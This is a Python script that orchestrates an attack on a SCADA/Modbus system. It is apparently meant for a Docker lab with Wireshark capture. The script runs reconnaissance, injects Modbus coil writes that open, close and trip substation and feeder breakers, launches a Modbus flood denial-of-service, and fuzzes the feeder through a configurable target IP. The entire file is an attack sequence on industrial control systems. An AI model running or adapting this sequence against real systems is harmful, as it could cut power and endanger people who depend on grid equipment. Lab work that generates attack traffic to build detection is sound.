
import subprocess
import time
import argparse
import sys

def run_step(description, command, duration=0):
    print(f"\n[+] Starting: {description}")
    print(f"    Command: {command}")
    
    try:
        # If duration is 0, run and wait
        if duration == 0:
            subprocess.run(command, shell=True, check=True)
        else:
            # Run for a specific duration (experimental, mostly for DoS)
            # For this simple script, we'll just run the command and wait if it's not a background process
            # but dos_flood.py creates its own duration.
            subprocess.run(command, shell=True, check=True)
            
        print(f"[+] Finished: {description}")
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Error executing {description}: {e}")
    except KeyboardInterrupt:
        print("\n[!] User Interrupted")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="SCADA Attack Scenario Orchestrator")
    parser.add_argument("--target", default="localhost", help="Target IP")
    args = parser.parse_args()
    
    target = args.target
    
    print("=== SCADA Attack Scenario Started ===")
    print("Ensure Wireshark is capturing on the Docker network interface.")
    time.sleep(2)

    # 1. Reconnaissance
    run_step("Reconnaissance Scan", f"python recon_scan.py --target {target} --ports 5002 5003 5004")
    time.sleep(5)

    # 2. Command Injection - Open GCB (Substation)
    # Unit 1, Coil 0, Value 0 (Open)
    run_step("Command Injection: Open GCB", f"python command_injection.py --target {target} --port 5002 --unit 1 write-coil 0 0")
    time.sleep(5)

    # 3. Command Injection - Close GCB (Substation)
    # Unit 1, Coil 0, Value 1 (Close)
    run_step("Command Injection: Close GCB", f"python command_injection.py --target {target} --port 5002 --unit 1 write-coil 0 1")
    time.sleep(5)
    
    # 4. Command Injection - Trip Feeder
    # Unit 2, Coil 0, Value 0 (Open Breaker)
    run_step("Command Injection: Trip Feeder", f"python command_injection.py --target {target} --port 5003 --unit 2 write-coil 0 0")
    time.sleep(5)

    # 5. DoS Attack - Modbus Flood on Substation
    run_step("DoS Attack: Modbus Flood (Substation)", f"python dos_flood.py --target {target} --port 5002 --duration 15 --threads 20")
    time.sleep(5)

    # 6. Fuzzing Attack - Feeder
    run_step("Fuzzing Attack: Feeder", f"python command_injection.py --target {target} --port 5003 --unit 2 fuzz --count 50")

    print("\n=== SCADA Attack Scenario Completed ===")

if __name__ == "__main__":
    main()
